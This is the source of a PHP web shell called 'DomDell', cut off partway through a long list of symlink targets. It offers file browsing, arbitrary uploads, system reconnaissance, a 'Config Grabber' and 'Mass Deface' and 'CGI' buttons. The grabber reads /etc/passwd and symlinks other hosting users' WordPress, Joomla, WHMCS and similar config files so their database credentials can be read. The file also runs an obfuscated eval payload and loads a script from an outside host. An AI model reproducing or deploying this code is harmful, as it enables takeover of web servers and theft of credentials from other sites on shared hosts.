<?php

error_reporting(0);
$free = disk_free_space("/") / 1073741824;
$total = disk_total_space("/") / 1073741824;
function RealIp()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
};
if (isset($_POST['mkdir'])) {
    if (isset($_GET['path'])) {
        if (mkdir($_GET['path'] . "/"  . $_POST['mkdir'])) {
            $createFolder = "Create Folder has been successful";
        } else {
            $createFolder = "We Can not Create Folder";
        }
    } else {
        if (mkdir($_POST['mkdir'])) {
            $createFolder = "Create Folder has been successful";
        } else {
            $createFolder = "We Can not Create Folder";
        }
    }
}
if (isset($_POST['file'])) {
    if (isset($_GET['path'])) {
        if (touch($_GET['path'] . "/" . $_POST['file'])) {
            $createFile = "Create File has been successful";
        } else {
            $createFile = "We Can not Create File";
        }
    } else {
        if (touch($_POST['file'])) {
            $createFile = "Create File has been successful";
        } else {
            $createFile = "We Can not Create File";
        }
    }
};
?>

<!DOCTYPE html>
<html>

<head>
	<script src="http://www.rootkitninja.com/say.js"></script>

    <title>DomDell</title>
</head>
<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@200&display=swap" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Raleway:wght@500&display=swap');

    body {
        /* background: rgb(2,1,19); */
        background: linear-gradient(90deg, rgba(2, 1, 19, 1) 0%, rgba(4, 25, 29, 1) 100%);
        background-repeat: no-repeat;
        background-size: cover;
        object-fit: cover;
        font-family: 'Raleway', sans-serif;

    }

    .btn {

        display: inline-block;
        padding: 0.35em 1.2em;
        border: 0.1em solid #FFFFFF;
        margin: 0 0.3em 0.3em 0;
        border-radius: 0.12em;
        box-sizing: border-box;
        text-decoration: none;
        font-weight: 300;
        color: white;
        text-align: center;
        transition: all 0.2s;
        background-color: rgb(1, 4, 6);
        background: transparent;
    }

    .btn:hover {
        color: #000000;
        background-color: #FFFFFF;
    }

    * {
        color: white;
        /* font-family: 'Nunito', sans-serif; */


    }

    .ip {

        position: absolute;
        top: 0px;
        right: 0px;
    }

    .Server {

        position: absolute;
        top: 20px;
        right: 0px;
    }

    .tools {
        color: black;
        background-color: rgb(17, 20, 23);
        height: 115px;
    }

    .tool {
        display: inline-block;
        padding: 0.35em 1.2em;
        border: 0.1em solid #FFFFFF;
        margin: 0 0.3em 0.3em 0;
        border-radius: 0.12em;
        box-sizing: border-box;
        text-decoration: none;
        font-family: 'Roboto', sans-serif;
        font-weight: 300;
        color: white;
        text-align: center;
        transition: all 0.2s;
        background-color: rgb(1, 4, 6);
        height: 50px;
    }

    .tool:hover {
        color: #000000;
        background-color: #FFFFFF;
    }

    li {

        list-style: none;
        list-style-type: none;
        display: inline-block;
        padding: 13px;
        font-size: 18px;
        margin-right: 83px;
        opacity: 1;
        margin-top: 20px;
        border-radius: 30%;


    }

    span {
        color: white;
    }

    a {
        text-decoration: none;
        color: white;
    }

    input {
        border: 2px solid white;
        padding: 5px 1px;
        font-size: 15px;
        border-radius: 5%;


    }

    textarea {
        color: white;
        background-color: rgba(128, 128, 128, 0.11);
        border-radius: 3%;
        border: 1px solid blue;
    }

    option,
    select {
        font-size: 15px;
        border: 1px solid blue;

    }

    table,
    tr {
        border: 5px solid rgba(128, 128, 128, 0.11);
        font-size: 15px;


    }

    .wrapper {
        width: 800px;
        height: 50vh;
        margin: 0 auto;

        display: flex;
        align-items: center;
        justify-content: center;
    }

    .cmd {
        position: relative;
        display: block;

        height: 300px;
        width: 100%;
        border: 1px solid #000000;
        border-radius: 4px;
        overflow: hidden;

        box-shadow: 0px 8px 18px #4b1d3f;
    }


    .title-bar {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        width: 100%;
        height: 40px;
        display: block;
        color: #FFFFFF;
        line-height: 40px;
        font-weight: 600;
        background-color: #242424;
        text-align: center;
    }

    .tool-bar {
        position: absolute;
        top: 40px;
        left: 0;
        right: 0;
        display: block;
        width: 100%;
        height: 30px;
        line-height: 30px;
        background-color: #242424;
    }

    .tool-bar ul {
        list-style-type: none;
        margin: 0px;
        padding: 0px;
    }

    .tool-bar ul li {
        display: inline-block;
        margin: 0;
        padding: 0;
    }

    .tool-bar ul li a {
        padding: 0px 6px;
        text-decoration: none;
        color: #FFFFFF;
    }

    .tool-bar ul li a:hover {
        text-decoration: underline;
    }

    .textarea {
        color: black;
        position: relative;
        top: 70px;
        padding: 12px;
        resize: none;
        width: 100%;
        height: calc(100% - 70px);
        background-color: #4b1d3f;
        border: none;
        color: #FFFFFF;
        margin: 0px;
        font-size: 1.1rem;
    }

    .mkdir {
        display: inline-block;
        width: 900px;
        padding: 70px;
    }

    .file {
        display: inline-block;
        padding: 40px;
    }

    .btnfilesys {
        color: black;
    }

    .selectFile {
        color: black;
    }

    option {
        color: black;
    }

    .home {
        color: black;
    }

    .createFolder {
        border: 2px solid white;
        background-color: grey;
    }
</style>

<body>
    <?php eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj=')))); ?>
    <?php echo "<span style='color:white'> Uname : </span>"  .  "<span>" . php_uname() . "</span>"; ?><br />
    <?php echo "<span style='color:white'>Server : </span>" . "<span>"  . $_SERVER['SERVER_SOFTWARE']  . "</span>" ?><br />
    <?php echo "<span style='color:white'>Whoami : </span>" . "<span>"  . get_current_user()  . "</span>" ?><br />
    <?php echo "<span style='color:white'>Safe Mode : </span>";
    if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode") == "on")) {
        echo "<span>ON</span>";
    } else {
        echo "<span>OFF</span>";
    }

    echo "<br/>";
    echo "<span style='color:white'> DOCUMENT ROOT : </span>" .  "<span style='font-weight:bold;color:red'>" . $_SERVER['DOCUMENT_ROOT'] . "</span>";
    echo "</br>";
    echo "<span style='color:white'>Disable Function : </span>";
    $disableFunction = @ini_get('disable_functions');
    $arr = explode(',', $disableFunction);
    foreach ($arr as $fun) {
        echo "<span style='#6666ff'>" . $fun  . "</span>";
    }
    echo "<br/>";
    echo "<span style='color:black'> Path : </span>";
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            $a = true;
            echo '<a href="?path=/">/</a>';
            continue;
        }
        if ($pat == '') continue;
        echo '<a href="?path=';
        for ($i = 0; $i <= $id; $i++) {
            echo "$paths[$i]";
            if ($i != $id) echo "/";
        }
        echo '">' . $pat . '</a>/';
    }
    ?>

    <br />
    <br />
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="Upload">
        <input type="submit" name="Load" value="Upload">
    </form>
    <?php
    $fileupload = @$_FILES['Upload'];

    if (isset($_POST['Load'])) {
        if (isset($_GET['path'])) {
            if (isset($fileupload['name'])) {
                move_uploaded_file($fileupload['tmp_name'], $_GET['path'] . "/" . $fileupload['name']);
                echo "Upload Has Been Successful";
            }
        }
    } else {
        if (isset($fileupload['name'])) {
            move_uploaded_file($fileupload['tmp_name'], $fileupload['name']);
            echo "Upload Has Been Successful";
        }
    }

    ?>
    <span class="Server"><?php echo "<span>Server IP : </span>" . "<span>" . $_SERVER['SERVER_ADDR']  . "</span>"; ?></span>
    <span class="ip"><?php echo "<span> Client IP : </span>" . "<span>" . RealIp() . "</span>"; ?></span>
    <div class="tools">
        <ul>
            <li><a style="color:white" href="<?php echo basename($_SERVER['SCRIPT_FILENAME']); ?>">Home</a></li>
            <form method="post" style="display: inline;">
                <li><input class="tool" name="done" type="submit" value="Config Grabber"></li>
            </form>
            <form method="post" style="display: inline-block;">
                <li><input class="tool" name="us" type="submit" value="Users"></li>
            </form>
            <form method="post" style="display: inline-block;">
                <li><input class="tool" type="submit" name="mass" value="Mass Deface"></li>
            </form>
            <form method="post" style="display: inline-block;">
                <li>
                    <input class="tool" type="submit" name="delet" value="Remove Shell">
                </li>
                <form method="post" style="display: inline-block;">
                    <li>
                        <input class="tool" type="submit" name="cgi" value="CGI">
                    </li>
                </form>
        </ul>
        </form>

    </div>
    <?php
    if (isset($_POST['done'])) {
        if (strtoupper(substr(php_uname(), 0, 3)) === 'WIN') {
            echo '<center>This is a server using Windows!</center>';
        } else {


    ?>
            <br />
            <br />

            <form method="post">
                <center>
                    <div class="wrapper">
                        <div class="cmd">
                            <div class="title-bar">DomDell@shell~</div>
                            <div class="tool-bar">
                            </div>
                            <textarea class="textarea" name="config" style="color: white; background-color: rgba(128, 128, 128, 0.11); border: 1px solid blue; border-radius: 3%" cols="70" rows="30"><?php $etc = file('/etc/passwd');
                                                                                                                                                                                                        foreach ($etc as $config) {
                                                                                                                                                                                                            echo $config;
                                                                                                                                                                                                        }
                                                                                                                                                                                                        ?>
        </textarea>
                        </div>
                    </div>

                    <textarea hidden name="config2"><?php $etc2 = file('/etc/passwd');
                                                    foreach ($etc as $config2) {
                                                        $str = explode(":", $config2);
                                                        echo $str[0] . "\n";
                                                    }
                                                    ?>
        </textarea>
                    <br />

                    <select class="home" name="home">

                        <option value="home">home</option>
                        <option value="home1">home1</option>
                        <option value="home2">home2</option>
                        <option value="home3">home3</option>
                        <option value="home4">home4</option>
                        <option value="home5">home5</option>
                        <option value="home6">home6</option>
                    </select>
                    <br><br><br>
                    <input style="color: white; background-color: black; border: 1px solid blue" type="submit" name="send" value='Grab ?'>

                </center>
            </form>

    <?php }
    }  ?>
    <?php
    if (isset($_POST['send'])) {
        if (isset($_GET['path'])) {
            if (file_exists("DomDell_Config")) {
                echo "<center>";
                echo "<br/>";
                echo "<a href='DomDell_Config'>Configuration Files</a>";
                echo "</center>";
            } else {
                $dir = mkdir($_GET['path'] . "/DomDell_Config", 0777);
                $usr = explode("\n", $_POST['config2']);
                foreach ($usr as $uss) {
                    $us = trim($uss);
                    $r = $_GET['path'] . "/DomDell_Config/";
                    symlink("/" . $_POST['home'] . "/" . $us . "/" . "config.php", $r . $us . "config.php");
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/inc/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/include/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/include/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/configuration/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/conf/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/connect/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/connect/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/configuration/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/db/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wp-config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wordpress/wp-config.php', $r . $us . '..word-wp');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blog/wp-config.php', $r . $us . '..wpblog');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/configuration.php', $r . $us . '..joomla-or-whmcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/joomla/configuration.php', $r . $us . '..joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/vb/includes/config.php', $r . $us . '..vbinc');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/config.php', $r . $us . '..vb');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/conf_global.php', $r . $us . '..conf_global');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/config.php', $r . $us . '..inc');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/config.php', $r . $us . '..config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Settings.php', $r . $us . '..Settings');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/sites/default/settings.php', $r . $us . '..sites');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/configuration.php', $r . $us . '..whm');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs/configuration.php', $r . $us . '..whmcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/configuration.php', $r . $us . '..supporwhmcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmc/WHM/configuration.php', $r . $us . '..WHM');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/WHMCS/configuration.php', $r . $us . '..whmc');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/whmcs/configuration.php', $r . $us . '..WHMcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/configuration.php', $r . $us . '..whmcsupp');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/configuration.php', $r . $us . '..whmcs-cli');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/configuration.php', $r . $us . '..whmcs-cl');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/configuration.php', $r . $us . '..whmcs-CL');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/configuration.php', $r . $us . '..whmcs-Cl');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientsupport/configuration.php', $r . $us . '..whmcs-csup');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/configuration.php', $r . $us . '..whmcs-bill');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/config.php', $r . $us . '..admin-conf');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/config/koneksi.php', $r . $us . '..Lokomedia');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/forum/config.php', $r . $us . '..phpBB');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/sites/default/settings.php', $r . $us . '..Drupal');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/config/settings.inc.php', $r . $us . '..PrestaShop');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/app/etc/local.xml', $r . $us . '..Magento');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/application/config/database.php', $r . $us . '..Ellislab');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/vb/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/forum/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/forums/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cc/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/config.php', $r . $us . '..MyBB');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/shop/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/os/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/oscom/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/products/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/conf_global.php', $r . $us . '..IPB');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wp/test/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blog/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/beta/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/portal/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/site/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wp/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WP/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/news/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wordpress/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/test/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/demo/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/home/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v1/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v2/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/press/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/new/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blogs/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blog/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cms/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/beta/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/portal/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/site/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/main/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/home/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/demo/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/test/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v1/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v2/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/joomla/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/new/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WHMCS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs1/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WHMC/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Whmc/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmc/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WHM/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Whm/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/HOST/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Host/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/host/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SUPPORTES/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Supportes/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/supportes/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/domains/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/domain/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Hosting/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/HOSTING/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hosting/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CART/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Cart/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/ORDER/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Order/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Client/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENTAREA/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Clientarea/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientarea/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SUPPORT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Support/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILLING/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Billing/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BUY/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Buy/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/buy/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/MANAGE/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Manage/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/manage/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENTSUPPORT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/ClientSupport/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Clientsupport/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientsupport/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CHECKOUT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Checkout/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/checkout/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILLINGS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BASKET/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Basket/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/basket/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SECURE/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Secure/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SALES/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Sales/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/sales/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILL/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Bill/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/bill/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/PURCHASE/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Purchase/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/purchase/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/ACCOUNT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Account/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/account/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/USER/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/User/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/user/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENTS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Clients/submitticket.php', $r . $us . '..WHMCS');
